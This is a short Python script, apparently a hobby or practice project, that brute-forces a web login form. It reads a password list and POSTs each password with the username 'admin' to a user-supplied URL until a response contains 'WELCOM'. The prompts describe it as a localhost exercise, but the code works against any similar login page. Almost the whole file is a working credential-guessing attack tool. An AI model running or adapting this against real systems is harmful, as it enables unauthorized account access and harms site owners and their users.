import requests
from colorama import Fore,init
import sys
import pic

init()

# sender function get a password and 
def sender(username,password,user_input_URL):
    payload={
        "username":username,
        "password":password,
        "submit":"submit"
        }
        
    # local host address    
    target_url = user_input_URL
    # send request to target address and get response from it and strored in {Response} variable
    response = requests.post(target_url, data=payload).text

    # check response returned from site is correct or not
    if("ERROR" in response):
        return False
    elif("WELCOM" in response):
        return True   

# main function send password and username to sender function
def main(user,passcode,number,user_input_user):

        # Get response from sender function and stored in {temp}    
        temp = sender(user,passcode,user_input_user)

        # check condition for finding password
        if (temp == True):
            print(Fore.GREEN ,"** Found Password and Username **")
            print(Fore.MAGENTA , "Username is -" , user , "- and passcode is -" , passcode,"-")
            sys.exit(0)
        else:
            print(f"{Fore.RED} [{number}] Testing Username: {Fore.WHITE} {user}  {Fore.RED} and Passcode: {Fore.CYAN} {passcode}") 

# star message
print("[Hello world and hello to you] :)\nGithub: [AliSharifyy]\nGithub: [Ali-Moattarirad]\n")
# print(logo)
print("[] First move Project Folder to your local host Directory")
print("Enter your Local host addres:  ")
print("example:\n-> http://localhost/php-python/php/index.php\n-> http://127.0.0.1/php-python/php/index.php")
user_input_user = input(": ")

# Open passlist file
with open ("./Pass-File-List/passlist.txt","r") as file:
    #Read pass list file and split it
    passfile = file.read().split()
    lenght = len(passfile)
    i = 0
    # iterate over all password in list
    while i <= lenght:
        # check if we goes to end of pass file so we cant pass and exit
        if(i == (lenght - 1)):
            print("cant find password :(")
            sys.exit(0)
        # send i[index] in password to sender function to Get is Norrect or Not
        main("admin",passfile[i],i,user_input_user)
        i += 1
        











